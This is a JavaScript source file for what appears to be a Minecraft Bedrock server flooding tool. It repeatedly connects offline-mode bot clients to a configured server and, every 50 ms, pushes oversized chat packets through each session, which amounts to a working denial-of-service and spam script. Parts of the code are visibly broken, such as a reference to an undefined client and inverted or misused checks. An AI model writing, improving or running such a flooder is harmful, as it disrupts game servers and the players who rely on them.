import { createClient } from 'bedrock-protocol';
import fetch from 'node-fetch';

let settings;
const getbots = async () => await fetch('http://localhost:62363/get-bots').then(res => res.json());
const setbots = async (method, arg = 'connected') => await fetch('http://localhost:62363/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type: method, arg: arg }),
});

let sessions = {};
let spawned = {};

process.setMaxListeners(0);

const start_client = (name) => new Promise(async (res, rej) => {
    if (!(process.memoryUsage().rss > settings.minecraft['max-ram']) || settings.minecraft['max-ram'] == 0) {
        if (await getbots().then(data => data.connected) > settings.minecraft['max-bots'] || settings.minecraft['max-bots'] == 0) {
            let session = createClient({
                host: settings.minecraft.ip,
                port: settings.minecraft.port,
                username: name,
                version: settings.minecraft.version,
                offline: true
            });

            const listeners = {
                join: () => {
                    res(session, name);
                    listeners.disable();
                },

                disconnect: () => {
                    rej(session, name);
                    listeners.disable();
                },

                error: () => {
                    rej(session, name);
                    listeners.disable();
                },

                spawn: () => {
                    setbots('+', 'spawned')
                    spawned[name] = '';
                },

                disable: () => {
                    name in spawned && (delete spawned[name], setbots('-', 'spawned'));
                    
                    session.off('disconnect', listeners.disconnect);
                    session.off('disconnect', listeners.disconnect);
                    session.off('error', listeners.error);
                    session.off('join', listeners.join);
                }
            };
        
            session.once('spawn', listeners.spawn)
            session.once('join', listeners.join);
            session.on('disconnect', listeners.disconnect);
            session.once('error', listeners.error);
        }
    };
});

const fludder = (async () => {
    setInterval(() => Object.keys(sessions).forEach(item => {
        try {
            sessions[item].queue('text', {
                type: 'chat',
                needs_translation: true,
                source_name: client.options.username,
                xuid: '',
                message: Buffer.from(settings.minecraft['flood-size'] * 1024, '𠀋')
            });
        } catch {};
    }), 50);
});

(async () => {
    settings = await fetch('http://localhost:62363/get-data').then(res => res.json());

    if (settings.minecraft['flood-size'] != 0) fludder();

    const make = async () => {
        await start_client(`${settings.minecraft['bot-name']} ${Math.random().toString(36).substring(6).toUpperCase()}`)
        .catch(async (_, name) => name in sessions && (delete sessions[name], setbots('-', 'valid'), await make()))
        .then(async (session, name) => (sessions[name] = session, setbots('+', 'valid'), await make()));
    };

    await make();
})();
